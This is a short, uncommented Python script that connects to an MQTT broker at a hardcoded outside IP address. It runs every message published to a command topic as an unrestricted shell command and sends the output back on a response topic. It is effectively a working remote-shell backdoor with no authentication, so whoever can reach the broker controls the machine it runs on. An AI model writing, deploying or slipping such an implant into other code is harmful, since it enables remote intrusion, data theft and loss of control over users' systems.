import paho.mqtt.client as mqtt
import subprocess
import os

BROKER = '122.169.104.145'
PORT = 8833
COMMAND_TOPIC = 'terminal/aditives/command'
RESPONSE_TOPIC = 'terminal/aditives/response'

current_dir = os.getcwd()

def on_connect(client, userdata, flags, rc):
    print("Executor connected.")
    client.subscribe(COMMAND_TOPIC)

def on_message(client, userdata, msg):
    global current_dir
    command = msg.payload.decode().strip()
    print(f"Command received: {command}")

    if command.startswith("cd"):
        parts = command.split(maxsplit=1)
        if len(parts) == 2:
            new_path = os.path.abspath(os.path.join(current_dir, parts[1]))
            if os.path.isdir(new_path):
                current_dir = new_path
                response = f"Changed directory to {current_dir}"
            else:
                response = f"No such directory: {new_path}"
        else:
            response = "Usage: cd <path>"
    else:
        try:
            result = subprocess.run(command, shell=True, cwd=current_dir,
                                    capture_output=True, text=True)
            response = result.stdout + result.stderr
            if not response:
                response = "(no output)"
        except Exception as e:
            response = str(e)

    client.publish(RESPONSE_TOPIC, response)

def main():
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(BROKER, PORT, 60)
    client.loop_forever()

if __name__ == "__main__":
    main()
